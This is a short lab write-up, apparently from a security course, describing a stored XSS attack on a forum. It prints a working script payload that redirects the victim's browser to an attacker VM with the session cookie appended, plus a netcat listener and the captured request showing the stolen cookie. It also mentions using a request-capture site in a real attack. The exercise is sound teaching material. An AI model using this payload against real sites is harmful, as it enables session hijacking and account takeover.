The trick to this XSS attack is to make the user somehow load a page from our
attacker VM, and also pass along the cookie. In order to do this, I posted the
malicious comment onto the forum:

<script>location.href="http://192.168.16.3/?"+encodeURI(document.cookie);</script>

This would effectively make the client's browser redirect to my attacker VM,
using a path that contained the cookie. This was the most straightforward way I
could think of, but there could be other ways, such as attaching a hook onto a
body onload or possibly other event listeners (although I'm not sure if phantom
or whatever the client automation script supports those).

Using the link of an image wouldn't really work in this case because we want to
pass the client's cookie in. In a real XSS attack, one could use a site such as
https://requestb.in/ if they don't have a server ready for the user to request.

The next step was to prepare the server to listen. Nothing fancy:

student@xenial64s:~$ sudo nc -l 80

Since HTTP requests are in plain text anyway, this call would reveal the cookie
immediately. Sure enough, the request came in, with the cookie:

GET /?auth=silva2806 HTTP/1.1
Host: 192.168.16.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive

The cookie is "auth=silva2806".

